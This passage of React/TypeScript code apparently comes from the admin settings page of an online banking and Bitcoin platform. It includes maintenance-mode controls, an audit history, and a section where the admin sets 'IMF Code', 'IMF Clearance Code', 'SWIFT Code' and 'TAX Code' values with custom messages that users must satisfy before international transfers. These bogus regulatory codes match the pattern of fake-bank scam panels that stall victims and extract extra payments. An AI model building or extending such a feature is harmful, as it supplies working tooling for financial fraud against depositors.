      setEnabled(next.maintenanceMode)
      setMessage(next.maintenanceMessage)
      setDirty(false)
      onSaved(next)
      toast({ title: next.maintenanceMode ? "Maintenance mode enabled" : "Maintenance mode disabled", variant: next.maintenanceMode ? "destructive" : "default" })
    } catch (err) {
      toast({ title: "Error", description: err instanceof Error ? err.message : "Failed", variant: "destructive" })
    } finally {
      setLoading(false)
    }
  }

  async function confirmEnable() {
    if (confirmText !== "MAINTENANCE") return
    setConfirmOpen(false)
    setEnabled(true)
    await save(true)
  }

  return (
    <>
      <div className="mt-2 space-y-4">
        {enabled && (
          <div className="flex items-center gap-2 bg-red-50 border border-red-200 rounded-lg px-4 py-3 text-sm text-red-700">
            <AlertTriangle className="w-4 h-4 flex-shrink-0" />
            <span>Maintenance mode is currently <strong>active</strong>. Users cannot access the platform.</span>
          </div>
        )}

        <ToggleRow
          label="Maintenance mode"
          description="Disables the platform for all non-admin users."
          checked={enabled}
          onChange={(v) => {
            if (v) { attemptEnable() }
            else   { setEnabled(false); setDirty(true) }
          }}
        />

        <div className="space-y-1">
          <Label className="text-xs font-medium text-gray-700">Maintenance message</Label>
          <textarea
            value={message}
            onChange={(e) => { setMessage(e.target.value); setDirty(true) }}
            rows={3}
            maxLength={500}
            placeholder="We'll be back shortly. Thank you for your patience."
            className="w-full text-sm border border-gray-300 rounded-lg px-3 py-2 resize-none focus:outline-none focus:ring-1 focus:ring-[#1A2CCE] focus:border-[#1A2CCE]"
          />
          <p className="text-xs text-gray-400">{message.length}/500</p>
        </div>

        <div className="flex items-center gap-2">
          <button
            type="button"
            onClick={() => setPreviewOpen(true)}
            className="text-xs text-indigo-600 hover:underline"
          >
            Preview maintenance banner
          </button>
        </div>

        <SaveButton isDirty={dirty} loading={loading} onClick={() => save()} />
      </div>

      {/* Confirm enable dialog */}
      <Dialog open={confirmOpen} onOpenChange={setConfirmOpen}>
        <DialogContent className="max-w-sm">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2 text-red-600">
              <AlertTriangle className="w-4 h-4" />
              Enable maintenance mode?
            </DialogTitle>
          </DialogHeader>
          <div className="space-y-3 text-sm text-gray-600">
            <p>This will immediately block all non-admin users from accessing the platform.</p>
            <p>Type <strong>MAINTENANCE</strong> to confirm:</p>
            <Input
              value={confirmText}
              onChange={(e) => setConfirmText(e.target.value)}
              placeholder="MAINTENANCE"
              autoFocus
            />
          </div>
          <DialogFooter>
            <Button variant="ghost" size="sm" onClick={() => setConfirmOpen(false)}>Cancel</Button>
            <Button
              size="sm"
              variant="destructive"
              disabled={confirmText !== "MAINTENANCE"}
              onClick={confirmEnable}
            >
              Enable maintenance mode
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Preview banner dialog */}
      <Dialog open={previewOpen} onOpenChange={setPreviewOpen}>
        <DialogContent className="max-w-lg">
          <DialogHeader>
            <DialogTitle>Maintenance banner preview</DialogTitle>
          </DialogHeader>
          <div className="bg-yellow-50 border border-yellow-300 rounded-xl p-6 text-center space-y-3">
            <AlertTriangle className="w-10 h-10 text-yellow-500 mx-auto" />
            <h2 className="font-semibold text-gray-900 text-lg">We are under maintenance</h2>
            <p className="text-sm text-gray-600">
              {message || "We'll be back shortly. Thank you for your patience."}
            </p>
          </div>
        </DialogContent>
      </Dialog>
    </>
  )
}

// ── Transfer codes section ────────────────────────────────────────────────────

function TransferCodeCard({
  codeKey, code, onChange,
}: {
  codeKey: string
  code: TransferCode
  onChange: (key: string, code: TransferCode) => void
}) {
  const labels: Record<string, { title: string; desc: string; color: string }> = {
    imfCode:          { title: "IMF Code", desc: "International Monetary Fund verification code", color: "#1A2CCE" },
    swiftCode:        { title: "SWIFT Code", desc: "SWIFT network verification code", color: "#12B76A" },
    imfClearanceCode: { title: "IMF Clearance Code", desc: "IMF clearance for high-value transfers", color: "#F79009" },
    taxCode:          { title: "TAX Code", desc: "Tax compliance verification code", color: "#F04438" },
  }
  const info = labels[codeKey] || { title: codeKey, desc: "", color: "#6B7280" }

  return (
    <div className={`border rounded-xl p-4 transition-all ${code.enabled ? "border-gray-300 bg-white" : "border-gray-100 bg-gray-50"}`}>
      <div className="flex items-start justify-between gap-3 mb-3">
        <div className="flex items-center gap-2">
          <div className="w-2 h-2 rounded-full" style={{ background: info.color }} />
          <div>
            <p className="text-sm font-semibold text-gray-900">{info.title}</p>
            <p className="text-xs text-gray-500">{info.desc}</p>
          </div>
        </div>
        <button
          role="switch"
          aria-checked={code.enabled}
          onClick={() => onChange(codeKey, { ...code, enabled: !code.enabled })}
          className={[
            "relative inline-flex h-5 w-9 flex-shrink-0 cursor-pointer rounded-full border-2 border-transparent transition-colors duration-200 ease-in-out focus:outline-none",
            code.enabled ? "bg-[#12B76A]" : "bg-gray-200",
          ].join(" ")}
        >
          <span className={[
            "pointer-events-none inline-block h-4 w-4 transform rounded-full bg-white shadow ring-0 transition duration-200 ease-in-out",
            code.enabled ? "translate-x-4" : "translate-x-0",
          ].join(" ")} />
        </button>
      </div>

      {code.enabled && (
        <div className="space-y-3 mt-3 pt-3 border-t border-gray-100">
          <div className="space-y-1">
            <Label className="text-xs font-medium text-gray-700">Verification Code</Label>
            <Input
              type="text"
              value={code.code}
              onChange={(e) => onChange(codeKey, { ...code, code: e.target.value })}
              placeholder="Enter the code users must enter"
              className="font-mono"
            />
            <p className="text-xs text-gray-400">The exact code users must enter to proceed</p>
          </div>
          <div className="space-y-1">
            <Label className="text-xs font-medium text-gray-700">Display Label</Label>
            <Input
              type="text"
              value={code.label}
              onChange={(e) => onChange(codeKey, { ...code, label: e.target.value })}
              placeholder="e.g. IMF Code"
            />
          </div>
          <div className="space-y-1">
            <Label className="text-xs font-medium text-gray-700">User Message</Label>
            <textarea
              value={code.message}
              onChange={(e) => onChange(codeKey, { ...code, message: e.target.value })}
              rows={3}
              maxLength={500}
              placeholder="Message shown to users when they need to enter this code"
              className="w-full text-sm border border-gray-300 rounded-lg px-3 py-2 resize-none focus:outline-none focus:ring-1 focus:ring-[#1A2CCE] focus:border-[#1A2CCE]"
            />
            <p className="text-xs text-gray-400">{code.message.length}/500</p>
          </div>
        </div>
      )}
    </div>
  )
}

function TransferCodesSection({ initial, onSaved }: { initial: Settings; onSaved: (s: Settings) => void }) {
  const { toast } = useToast()
  const [loading, setLoading] = useState(false)
  const [codes, setCodes] = useState<TransferCodeSettings>(initial.transferCodes)
  const [dirty, setDirty] = useState(false)

  function handleChange(key: string, code: TransferCode) {
    setCodes((prev) => ({ ...prev, [key]: code }))
    setDirty(true)
  }

  async function save() {
    setLoading(true)
    try {
      const res = await fetch("/api/admin/settings", {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ transferCodes: codes }),
      })
      const json = await res.json() as Record<string, unknown>
      if (!res.ok) throw new Error((json.error as string) ?? "Failed")
      const next = toSettings(json)
      setCodes(next.transferCodes)
      setDirty(false)
      onSaved(next)
      toast({ title: "Transfer code settings saved" })
    } catch (err) {
      toast({ title: "Error", description: err instanceof Error ? err.message : "Failed", variant: "destructive" })
    } finally {
      setLoading(false)
    }
  }

  const enabledCount = Object.values(codes).filter((c) => c.enabled).length

  return (
    <div className="mt-2 space-y-4">
      {enabledCount > 0 && (
        <div className="flex items-center gap-2 bg-amber-50 border border-amber-200 rounded-lg px-4 py-3 text-sm text-amber-700">
          <AlertTriangle className="w-4 h-4 flex-shrink-0" />
          <span><strong>{enabledCount}</strong> verification code{enabledCount > 1 ? "s" : ""} enabled. Users will be required to enter these codes for international transfers.</span>
        </div>
      )}

      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        <TransferCodeCard codeKey="imfCode" code={codes.imfCode} onChange={handleChange} />
        <TransferCodeCard codeKey="swiftCode" code={codes.swiftCode} onChange={handleChange} />
        <TransferCodeCard codeKey="imfClearanceCode" code={codes.imfClearanceCode} onChange={handleChange} />
        <TransferCodeCard codeKey="taxCode" code={codes.taxCode} onChange={handleChange} />
      </div>

      <SaveButton isDirty={dirty} loading={loading} onClick={save} />
    </div>
  )
}

// ── History section ───────────────────────────────────────────────────────────

function HistorySection({ history }: { history: HistoryEntry[] }) {
  function timeLabel(entry: HistoryEntry): string {
    const ts = entry.createdAt ?? entry.timestamp
    if (!ts) return ""
    const d = new Date(ts)
    return d.toLocaleString()
  }

  function changesSummary(entry: HistoryEntry): string {
    if (!entry.changes) return ""
    const keys = Object.keys(entry.changes)
    if (keys.length === 0) return ""
    if (keys.length <= 3) return keys.join(", ")
    return `${keys.slice(0, 3).join(", ")} +${keys.length - 3} more`
  }

  if (history.length === 0) {
    return (
      <div className="mt-3 text-center py-8 text-gray-400 text-sm">
        No settings changes recorded yet.
      </div>
    )
  }

  return (
    <div className="mt-3 relative">
      {/* Timeline line */}
      <div className="absolute left-3 top-0 bottom-0 w-0.5 bg-gray-200" />

      <div className="space-y-4 pl-8">
        {history.map((entry, i) => (
          <div key={String(entry._id ?? entry.id ?? i)} className="relative">
            {/* Dot */}
            <span className="absolute -left-[26px] top-1 w-3 h-3 rounded-full bg-white border-2 border-[#1A2CCE]" />

            <div className="bg-gray-50 border border-gray-100 rounded-lg px-4 py-3 text-sm">
              <div className="flex items-center justify-between gap-2 flex-wrap">
                <span className="font-medium text-gray-900">{entry.action ?? "Settings updated"}</span>
                <span className="text-xs text-gray-400 flex items-center gap-1">
                  <Clock className="w-3 h-3" />
                  {timeLabel(entry)}
                </span>
              </div>
              <p className="text-xs text-gray-500 mt-1">By {entry.adminEmail}</p>
              {changesSummary(entry) && (
                <p className="text-xs text-gray-400 mt-1">Changed: {changesSummary(entry)}</p>
              )}
            </div>
          </div>
        ))}
      </div>
    </div>
  )
}

// ── Main component ────────────────────────────────────────────────────────────

export function SettingsClient({ settings: rawSettings, history: rawHistory }: Props) {
  const [current,  setCurrent]  = useState<Settings>(() => toSettings(rawSettings))
  const [history,  setHistory]  = useState<HistoryEntry[]>(() => rawHistory as unknown as HistoryEntry[])
  const [anyDirty, setAnyDirty] = useState(false)
  const { toast } = useToast()

  // Warn on unsaved changes
  useEffect(() => {
    function handleBeforeUnload(e: BeforeUnloadEvent) {
      if (!anyDirty) return
      e.preventDefault()
      e.returnValue = ""
    }
    window.addEventListener("beforeunload", handleBeforeUnload)
    return () => window.removeEventListener("beforeunload", handleBeforeUnload)
  }, [anyDirty])

  const handleSaved = useCallback((next: Settings) => {
    setCurrent(next)
    setAnyDirty(false)
    // Refresh history
    fetch("/api/admin/settings/history?limit=10")
      .then((r) => r.json())
      .then((h) => setHistory(h as HistoryEntry[]))
      .catch(() => {})
  }, [])

  return (
    <div className="space-y-5 max-w-3xl">
      {/* Header */}
      <div className="flex items-start justify-between">
        <div>
          <h1 className="text-2xl font-semibold text-gray-900">App settings</h1>
          <p className="text-sm text-gray-500 mt-1">Global platform configuration and feature flags</p>
        </div>
        {anyDirty && (
          <div className="flex items-center gap-2 text-xs text-amber-600 bg-amber-50 border border-amber-200 rounded-lg px-3 py-2">
            <AlertTriangle className="w-3.5 h-3.5" />
            Unsaved changes
          </div>
        )}
      </div>

      {/* Sections */}
      <Section
        title="Bitcoin swap"
        description="Fee percentage and amount limits for fiat ↔ BTC conversions"
        defaultOpen
      >
        <BitcoinSwapSection initial={current} onSaved={handleSaved} />
      </Section>

      <Section
        title="Transfer fees"
        description="Flat fees and daily limits for user-to-user transfers"
      >
        <TransferFeesSection initial={current} onSaved={handleSaved} />
      </Section>

      <Section
        title="Currency"
        description="Default and supported fiat currencies across the platform"
      >
        <CurrencySection initial={current} onSaved={handleSaved} />
      </Section>

      <Section
        title="Registration & access"
        description="Control who can sign up and what verification is required"
      >
        <RegistrationSection initial={current} onSaved={handleSaved} />
      </Section>

      <Section
        title="Cards"
        description="Application fees, per-user limit and required KYC tier for cards"
      >
        <CardsSection initial={current} onSaved={handleSaved} />
      </Section>

      <Section
        title="Contact & support"
        description="Phone, text/SMS number, email and address shown to customers"
      >
        <ContactSection initial={current} onSaved={handleSaved} />
      </Section>

      <Section
        title="Maintenance mode"
        description="Take the platform offline for non-admin users"
      >
        <MaintenanceSection initial={current} onSaved={handleSaved} />
      </Section>

      <Section
        title="International transfer codes"
        description="Verification codes required for international wire transfers"
      >
        <TransferCodesSection initial={current} onSaved={handleSaved} />
      </Section>

      <Section
        title="Settings history"
        description="Audit log of recent configuration changes"
      >
        <HistorySection history={history} />
      </Section>
    </div>
  )
}
